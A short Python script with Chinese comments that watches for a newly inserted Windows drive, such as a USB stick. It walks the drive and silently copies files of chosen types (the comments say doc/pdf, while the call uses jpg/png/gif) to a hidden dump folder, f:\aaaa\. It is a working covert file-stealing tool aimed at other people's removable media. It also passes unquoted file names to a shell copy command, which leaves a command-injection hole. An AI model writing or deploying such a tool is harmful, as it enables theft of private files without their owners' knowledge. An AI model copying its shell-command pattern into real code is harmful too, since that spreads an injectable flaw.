import os,re,time
def get_disk(disk_all_list):#获取原有盘符
	disk_list = []
	for num in range(26):
		if os.path.exists(disk_all_list[num] + ':\\') == True:
			disk_list.append(disk_all_list[num])
	return disk_list
def while_disk(disk_list_u,file_type):#死循环直到新盘符出现
	while True:
		time.sleep(2)
		for n in disk_list_u:
			if os.path.exists(n + ':\\') == True:
				find_file(n,file_type)
def find_file(path,file_type):#遍历所有的新盘符内的doc|pdf文件
	file_list = []
	for root,dirs,files in os.walk(path + ':\\'):
		for name in files:
			if re.findall('.*\\.(%s)'%file_type,name):
				file_list.append(os.path.join(root,name))
	copy_file(file_list)
def copy_file(file_lists):#文件复制到f:\\aaaa\\
	for x in file_lists:
		os.popen('copy /y %s f:\\aaaa\\'%x) #设置转存路径++++++++++++++++++++++++++++++++++++
	os._exit(0)
if __name__ == '__main__':
	disk_all_list = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
	disk_list_local = get_disk(disk_all_list)
	disk_list_u = list(set(disk_all_list)-set(disk_list_local))
	while_disk(disk_list_u,'(?:jpg|png|gif)') #文件类型++++++++++++++++++++++++++++++